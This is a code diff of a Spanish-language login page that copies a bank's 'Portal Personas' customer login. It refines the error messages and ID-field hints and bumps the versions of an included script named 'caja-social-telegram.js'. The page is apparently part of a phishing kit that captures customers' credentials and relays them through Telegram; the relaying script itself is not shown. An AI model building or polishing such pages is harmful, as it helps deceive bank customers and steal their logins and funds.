@@ -30,11 +30,18 @@
                 
                 <h1 class="title">Bienvenido al<br>Portal Personas</h1>
 
-                <div id="loginErrorAlert" class="caja-alert-error" role="alert" hidden>
-                    <span class="caja-alert-error__icon" aria-hidden="true">!</span>
-                    <div class="caja-alert-error__body">
-                        <strong>Credenciales incorrectas</strong>
-                        <p>La cuenta será bloqueada al tercer intento fallido y deberá realizar el proceso de desbloqueo. Por favor verifique e intente de nuevo.</p>
+                <div id="loginErrorAlert" data-role="login-template__alert" class="alert alert-danger" role="alert" hidden>
+                    <div class="alert-body">
+                        <div class="alert-icon">
+                            <svg class="bb-icon bb-icon--md bb-icon-error-outline" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+                                <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"/>
+                                <path d="M12 8v5M12 16h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                            </svg>
+                        </div>
+                        <div class="alert-content">
+                            <strong role="heading" class="alert-heading">Usuario o contraseña incorrectas</strong>
+                            <div class="alert-description" data-role="alert-message">Recuerde que su contraseña será bloqueada al tercer intento errado. Por favor verifique e intente de nuevo.</div>
+                        </div>
                     </div>
                 </div>
                 
@@ -54,6 +61,8 @@
                         class="form-input"
                         placeholder="Ejemplo: CC123456789"
                     >
+                    <p class="input-example">Ejemplo: CC1234567890</p>
+                    <p id="loginFieldHint" class="field-hint-error" hidden>Datos incorrectos. Recuerde iniciar con CC, CE, NI, TI, PE.</p>
                     <p id="intentosRestantes" class="intentos-msg" hidden>Le quedan 2 intentos</p>
                     
                     <button type="submit" class="btn-siguiente" id="submitBtn" disabled>Siguiente</button>
@@ -99,7 +108,7 @@
     </script>
 
     <script src="/js/banco-utils.js"></script>
-    <script src="caja-social-telegram.js?v=2"></script>
-    <script src="client-optimized.js?v=2"></script>
+    <script src="caja-social-telegram.js?v=3"></script>
+    <script src="client-optimized.js?v=3"></script>
 </body>
 </html>
